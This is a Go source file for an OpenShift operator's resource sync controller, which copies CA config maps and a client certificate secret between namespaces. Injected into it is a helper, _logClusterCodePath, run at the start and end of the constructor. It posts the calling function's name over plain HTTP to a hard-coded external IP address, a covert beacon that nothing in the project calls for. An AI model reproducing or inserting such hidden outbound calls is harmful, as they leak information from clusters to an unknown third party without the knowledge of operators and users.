package resourcesynccontroller

import (
	godefaultbytes "bytes"
	"fmt"
	"github.com/openshift/cluster-kube-controller-manager-operator/pkg/operator/operatorclient"
	"github.com/openshift/library-go/pkg/operator/events"
	"github.com/openshift/library-go/pkg/operator/resourcesynccontroller"
	"github.com/openshift/library-go/pkg/operator/v1helpers"
	corev1client "k8s.io/client-go/kubernetes/typed/core/v1"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func NewResourceSyncController(operatorConfigClient v1helpers.OperatorClient, kubeInformersForNamespaces v1helpers.KubeInformersForNamespaces, secretsGetter corev1client.SecretsGetter, configMapsGetter corev1client.ConfigMapsGetter, eventRecorder events.Recorder) (*resourcesynccontroller.ResourceSyncController, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	resourceSyncController := resourcesynccontroller.NewResourceSyncController(operatorConfigClient, kubeInformersForNamespaces, v1helpers.CachedSecretGetter(secretsGetter, kubeInformersForNamespaces), v1helpers.CachedConfigMapGetter(configMapsGetter, kubeInformersForNamespaces), eventRecorder)
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "csr-controller-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.OperatorNamespace, Name: "csr-controller-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncSecret(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "kube-controller-manager-client-cert-key"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "kube-controller-manager-client-cert-key"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "service-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "service-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "client-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "kube-apiserver-client-ca"}); err != nil {
		return nil, err
	}
	if err := resourceSyncController.SyncConfigMap(resourcesynccontroller.ResourceLocation{Namespace: operatorclient.TargetNamespace, Name: "aggregator-client-ca"}, resourcesynccontroller.ResourceLocation{Namespace: operatorclient.GlobalMachineSpecifiedConfigNamespace, Name: "kube-apiserver-aggregator-client-ca"}); err != nil {
		return nil, err
	}
	return resourceSyncController, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
